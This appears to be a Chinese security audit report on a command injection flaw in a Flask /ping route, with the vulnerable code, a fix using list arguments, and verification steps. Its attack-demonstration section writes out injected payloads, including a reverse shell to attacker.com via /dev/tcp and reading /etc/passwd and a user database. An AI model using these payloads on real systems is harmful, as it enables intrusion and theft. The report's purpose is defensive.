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2026-07-16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UM-2026-009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严重（Critical）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修复提交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003fd94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 Ping 网络诊断功能（/ping 路由）中发现一处"命令注入"漏洞（Command Injection）。该路由使用 f-string 字符串拼接 + shell=True 的方式构建并执行系统命令。由于用户输入被直接嵌入 shell 命令字符串中，未做任何过滤，攻击者可以通过特殊字符（;、|、&amp;&amp; 等）注入任意系统命令，在服务器上实现远程代码执行。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2.1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函数：ping() — /ping 路由</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>关键代码：subprocess.check_output(f"ping -c 3 {ip}", shell=True)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 漏洞原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>当 subprocess.check_output() 使用 shell=True 时，Python 会将命令字符串交给系统 Shell（Linux 上是 /bin/sh，Windows 上是 cmd.exe）来解析执行。Shell 会将分号（;）、管道符（|）、逻辑与（&amp;&amp;）、逻辑或（||）等字符解释为命令分隔符。由于用户输入的 ip 参数通过 f-string 直接拼入命令字符串，攻击者输入 "8.8.8.8; whoami" 时，Shell 会先执行 ping 8.8.8.8，然后执行 whoami，从而实现任意命令注入。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.3 漏洞代码（修复前）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>@app.route("/ping", methods=["GET", "POST"])</w:t>
        <w:br/>
        <w:t>def ping():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # ...</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if request.method == "POST":</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ip = request.form.get("ip", "").strip()</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if ip:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            # 漏洞：f-string 拼接 + shell=True = 命令注入</w:t>
        <w:br/>
        <w:t xml:space="preserve">            cmd = f"ping -c 3 {ip}"</w:t>
        <w:br/>
        <w:t xml:space="preserve">            output = subprocess.check_output(cmd, shell=True,</w:t>
        <w:br/>
        <w:t xml:space="preserve">                timeout=30, stderr=subprocess.STDOUT)</w:t>
        <w:br/>
        <w:t xml:space="preserve">            result = output.decode("utf-8", errors="replace")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.4 攻击演示</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>读取系统文件：</w:t>
      </w:r>
      <w:r>
        <w:t>输入：8.8.8.8; cat /etc/passwd</w:t>
        <w:br/>
        <w:t>Shell 先执行 ping，再执行 cat /etc/passwd，将系统密码文件内容返回给攻击者。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>获取反向 Shell：</w:t>
      </w:r>
      <w:r>
        <w:t>输入：8.8.8.8; bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1</w:t>
        <w:br/>
        <w:t>攻击者获得服务器的交互式 Shell，完全控制服务器。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>窃取数据库：</w:t>
      </w:r>
      <w:r>
        <w:t>输入：8.8.8.8; cat data/users.db | base64</w:t>
        <w:br/>
        <w:t>将整个用户数据库文件 base64 编码后返回，攻击者解码即可获取所有用户信息。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>管道符注入：</w:t>
      </w:r>
      <w:r>
        <w:t>输入：8.8.8.8 | ls -la /</w:t>
        <w:br/>
        <w:t>利用管道符 | 执行 ls -la /，列出服务器根目录所有文件。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.5 初学者理解</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>打个比方：shell=True 就像把一张纸条递给服务员。纸条上写着"ping baidu.com"。用 f-string 拼接后，用户的输入变成了纸条内容的一部分。攻击者写的是："ping baidu.com; 偷走所有数据"。服务员（Shell）拿到纸条后，看到分号，就认为这是两条指令，于是两条都执行了。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.6 危害总结</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>远程代码执行（RCE）：攻击者可在服务器上执行任意系统命令。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>完全控制服务器：读写任意文件、安装恶意软件、以内网为跳板攻击其他系统。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>数据泄露：可直接读取用户数据库、源代码、系统配置文件等敏感信息。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>拒绝服务攻击：执行破坏性命令导致服务器崩溃或资源耗尽。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修复思路</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>将 shell=True + 字符串拼接的方式，改为列表方式传参。列表方式下，每个列表元素就是一个独立的命令行参数，不会经过 Shell 解释。用户输入中的特殊字符（;、|、&amp;&amp; 等）会被当作参数的普通字符，而不是命令分隔符。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 修复代码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>@app.route("/ping", methods=["GET", "POST"])</w:t>
        <w:br/>
        <w:t>def ping():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # ...</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if request.method == "POST":</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ip = request.form.get("ip", "").strip()</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if ip:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            # 修复：列表方式传参，不使用 shell=True</w:t>
        <w:br/>
        <w:t xml:space="preserve">            output = subprocess.check_output(</w:t>
        <w:br/>
        <w:t xml:space="preserve">                ["ping", "-c", "3", ip],</w:t>
        <w:br/>
        <w:t xml:space="preserve">                timeout=30, stderr=subprocess.STDOUT)</w:t>
        <w:br/>
        <w:t xml:space="preserve">            result = output.decode("utf-8", errors="replace")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 为什么这样修复有效</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>不用 shell=True：</w:t>
      </w:r>
      <w:r>
        <w:t>命令字符串不会交给 Shell 解释器，Python 直接调用 ping 程序。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>列表方式传参：</w:t>
      </w:r>
      <w:r>
        <w:t>每个列表元素就是一个参数。["ping", "-c", "3", "8.8.8.8; whoami"] 的意思是：执行 ping，参数1是 "-c"，参数2是 "3"，参数3是 "8.8.8.8; whoami" 这个字面量字符串。分号和 whoami 只是目标主机名的一部分，不会创建新命令。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>实际效果：</w:t>
      </w:r>
      <w:r>
        <w:t>ping 会尝试把 "8.8.8.8; whoami" 当成主机名去解析，结果当然解析失败，返回 "unknown host" 错误。这是安全的、正确的行为。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.4 核心改动对比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修复前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修复后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shell 参数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shell=True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不传（默认 False）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命令构建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cmd = f"ping -c 3 {ip}"（字符串拼接）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["ping", "-c", "3", ip]（列表传参）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.5 提交记录</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Commit: 003fd94 — fix: prevent command injection by using list args instead of shell=True</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.6 修复验证</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>正常输入（8.8.8.8）→ ping 正常执行，返回延迟统计信息。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>注入攻击（8.8.8.8; whoami）→ ping 将整串当成主机名，解析失败返回 "unknown host"，whoami 不会被执行。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>注入攻击（8.8.8.8 | ls）→ 同上，管道符只是主机名的一部分，不会被解释执行。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>注入攻击（8.8.8.8 &amp;&amp; cat /etc/passwd）→ 同上，&amp;&amp; 不会被解释执行。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>空输入 → 前端 required 属性阻止提交。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输入格式校验</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>当前修复阻止了命令执行，但没有校验输入是否为合法的 IP 或域名。无效输入会导致 ping 报错，属于良性失败。为提高健壮性，建议增加输入格式校验。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 后续加固建议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>校验 IP/域名格式：</w:t>
      </w:r>
      <w:r>
        <w:t>使用正则表达式或 ipaddress 模块校验输入是否为合法的 IP 地址或域名格式，拒绝包含特殊字符的非法输入。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>增加请求频率限制：</w:t>
      </w:r>
      <w:r>
        <w:t>限制单个用户的 ping 请求频率，防止被滥用进行 ICMP 洪水攻击或资源耗尽。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2026-07-16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 Ping 网络诊断功能（/ping），存在命令注入漏洞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2026-07-16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安全审查发现命令注入漏洞（UM-2026-009）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2026-07-16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提交修复 commit 003fd94，改用列表方式传参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本次修复针对命令注入漏洞（UM-2026-009），将 /ping 路由中的 subprocess.check_output() 调用从 shell=True + 字符串拼接的方式，改为列表方式传参。只修改了 2 行代码，不影响正常功能，但彻底阻断了通过特殊字符注入系统命令的攻击路径。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>修复后，用户输入 "8.8.8.8; whoami" 不再被 Shell 解释为两条命令，而是作为 ping 的目标主机名字面量，ping 会因解析失败而返回错误。正常的 ping 功能完全不受影响。修复已于 2026-07-16 推送到 GitHub（commit 003fd94）。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